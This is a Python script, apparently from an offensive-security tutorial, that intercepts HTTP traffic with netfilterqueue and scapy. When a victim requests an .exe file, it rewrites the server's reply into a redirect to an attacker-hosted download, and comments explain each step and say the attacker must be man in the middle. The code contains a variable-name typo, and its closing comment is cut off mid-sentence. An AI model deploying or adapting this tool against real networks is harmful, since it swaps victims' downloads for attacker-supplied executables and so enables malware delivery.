#!/usr/bin/env python

import netfilterqueue                                       #library to access the queue that is stored using iptables.
import scapy.all as scapy

ack_list=[]                                                 #creating a list.

def process_packet(packet):
   scapy_packet=scapy.IP(packet.get_payload())              #wrapping the payload of the packet into IP layer of the scapy packet.
                                                            #this is done to convert the packet into a scapy packet which is easy to interacy with.
   if scapy_packet.haslayer(scapy.Raw):                     #using the haslayer function to check raw layer in response packet

     if scapy_packet[scapy.TCP].dport == 80:                #to check if the packet is a HTTP request
            if ".exe" in scapy_packet[scapy.Raw].load and "rarlab" not in scpay_packet[scapy.Raw].load:      #checking for exe in the raw.load attrubute in the packet
                                                            #rarlab is the name of the download that i want to replace with. making sure that he didn't request for the same file.
               ack_list.append(scapy_packet[scapy.TCP].ack)                                                  #storing the acknowledgement packet.
               print("[+] exe request found")

     elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list:     #if seq number and the ack number of the get request packet matches
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] replacing file")
                scapy_packet[scapy.Raw].load="HTTP/1.1 301 Moved Permanently\nLocation: https://rarlab/rar.exe\n\n"   #insertin the url of the your download file location that should be on a hosted service in the internet.
                                                                                        #enter your file location\n\n
                del scapy_packet[scapy.IP].len              # all these should be deleted because it contains the data of the original response.
                del scapy_packet[scapy.IP].chksum           # but scapy automatically calculates the fields according to the updated value.
                del scapy_packet[scapy.TCP].chksum
                packet.set_payload(str(scapy_packet))
                print(scapy_packet.show())                  #it shows the actual content in the packets.

   packet.accept()

queue = netfilterqueue.NetfilterQueue()                     #creating an instance of netfilterqueue object
queue.bind(1,process_packet)                                #bind is a method from NetfilteQueue object.
                                                            # it is used to add the existing iptables list that is created; to the queue instance that we have created.
                                                            #"1" is the name of the list that we store the iptables content.
                                                            # process_packet is the call back functionfunction that gets executed for the each packet.
queue.run()                                                 #to run the queue that is created.


#COMMENTS
#attacker needs to be man in the middle and